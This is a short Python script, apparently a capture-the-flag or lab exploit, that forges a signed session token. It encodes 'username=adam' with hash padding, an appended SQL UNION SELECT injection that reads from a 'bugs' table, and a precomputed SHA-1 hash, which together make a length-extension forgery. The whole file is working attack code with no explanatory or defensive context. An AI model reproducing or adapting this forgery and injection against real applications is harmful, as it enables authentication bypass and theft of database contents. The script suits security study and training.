from base64 import b64decode, b64encode

forged_token_data = "757365726e616d653d6164616d8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004682720554e494f4e2053454c454354202853454c454354207469746c652066726f6d2062756773205748455245206964203d33293b202d2d"
forged_token_data = bytes.fromhex(forged_token_data)
print(forged_token_data)
forged_token_data = b64encode(forged_token_data).decode().strip("=")

forged_token_hash = "92436b0fb71b210dc41d2065c9f2fbfc51e679ba"
forged_token_hash = bytes.fromhex(forged_token_hash)
forged_token_hash = b64encode(forged_token_hash).decode().strip("=")

forged_token = forged_token_data + "." + forged_token_hash
print(forged_token)
